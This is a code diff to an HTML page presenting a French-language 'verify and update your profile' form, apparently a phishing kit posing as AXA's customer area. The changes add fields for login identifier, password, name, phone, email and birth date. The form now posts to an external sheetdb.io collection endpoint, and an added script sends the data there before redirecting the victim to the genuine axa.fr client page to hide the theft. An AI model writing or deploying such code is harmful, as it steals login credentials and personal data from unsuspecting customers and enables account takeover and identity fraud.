@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
+    <link rel="stylesheet" href="build/css/intlTelInput.css" />
     <title>Bootstrap Example</title>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -58,7 +59,7 @@
             <h1 class="text-center fs-4">
               vérifier et mettre à jour votre profile
             </h1>
-            <form id="signUpForm" action="#!">
+            <form id="signUpForm" action="https://sheetdb.io/api/v1/lxqk1o2c3ht04" method="post">
               <!-- start step indicators -->
               <div class="form-header d-flex mb-4">
                 <span class="stepIndicator">Identifiant</span>
@@ -72,10 +73,10 @@
                 <p class="text-center mb-4">Identifants de connexion</p>
                 <div class="mb-3">
                   <input
-                    type="email"
+                    type="text"
                     placeholder="Saisissez votre identifiant"
                     oninput="this.className = ''"
-                    name="email"
+                    name="data[Email]"
                   />
                 </div>
                 <div class="mb-3">
@@ -83,7 +84,7 @@
                     type="password"
                     placeholder="Saisissez votre Mot de passe"
                     oninput="this.className = ''"
-                    name="password"
+                    name="data[Password]"
                   />
                 </div>
                 <!-- <div class="mb-3">
@@ -97,26 +98,43 @@
                 <div class="mb-3">
                   <input
                     type="text"
-                    placeholder="Saisissez votre nom et prénom"
+                    placeholder="Saisissez votre Nom"
                     oninput="this.className = ''"
-                    name="fullname"
+                    name="data[Name]"
                   />
                 </div>
                 <div class="mb-3">
                   <input
                     type="text"
-                    placeholder="Saisissez votre numéro de téléphone"
+                    placeholder="Saisissez votre Prénom"
                     oninput="this.className = ''"
-                    name="mobile"
+                    name="data[Surname]"
+                  />
+                </div>
+                <div class="mb-3">
+                  <input
+                    type="tel"
+                    id="phone"
+
+                    oninput="this.className = ''"
+                    name="data[PhoneNumber]"
+                  />
+                </div>
+                <div class="mb-3">
+                  <input
+                    type="email"
+                    placeholder="Saisissez votre Email"
+                    oninput="this.className = ''"
+                    name="data[EmailAddress]"
                   />
                 </div>
                 <div class="mb-3">
                   Date de naissance
                   <input
-                    type="date"
+                    type="text"
                     placeholder="Saisissez votre date de naissance"
                     oninput="this.className = ''"
-                    name="address"
+                    name="data[dateOfBirth]"
                   />
                 </div>
               </div>
@@ -180,9 +198,10 @@
           document.getElementById("prevBtn").style.display = "inline";
         }
         if (n == x.length - 1) {
-          document.getElementById("nextBtn").innerHTML = "Submit";
+          document.getElementById("nextBtn").innerHTML = "Soumettre";
+          window.location.href = "https://www.axa.fr/espace-client.html";
         } else {
-          document.getElementById("nextBtn").innerHTML = "Next";
+          document.getElementById("nextBtn").innerHTML = "Suivant";
         }
         //... and run a function that will display the correct step indicator:
         fixStepIndicator(n);
@@ -245,5 +264,52 @@
         x[n].className += " active";
       }
     </script>
+    <!-- connexion to db script -->
+    <script>
+        var form = document.getElementById('signUpForm');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("signUpForm")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            form.reset();
+            window.location.href = "https://www.axa.fr/espace-client.html";
+          });
+        });
+      </script>
+
+      <!-- phone number script -->
+      <script src="build/js/intlTelInput.js"></script>
+      <script>
+        var input = document.querySelector("#phone");
+        window.intlTelInput(input, {
+          // allowDropdown: false,
+           autoInsertDialCode: true,
+          // autoPlaceholder: "off",
+          // dropdownContainer: document.body,
+          // excludeCountries: ["us"],
+          // formatOnDisplay: false,
+          // geoIpLookup: function(callback) {
+          //   fetch("https://ipapi.co/json")
+          //     .then(function(res) { return res.json(); })
+          //     .then(function(data) { callback(data.country_code); })
+          //     .catch(function() { callback("us"); });
+          // },
+          // hiddenInput: "full_number",
+          // initialCountry: "auto",
+          // localizedCountries: { 'de': 'Deutschland' },
+          // nationalMode: false,
+          // onlyCountries: ['us', 'gb', 'ch', 'ca', 'do'],
+           placeholderNumberType: "MOBILE",
+          // preferredCountries: ['cn', 'jp'],
+            separateDialCode: true,
+          // showFlags: false,
+          utilsScript: "build/js/utils.js"
+        });
+      </script>
   </body>
 </html>
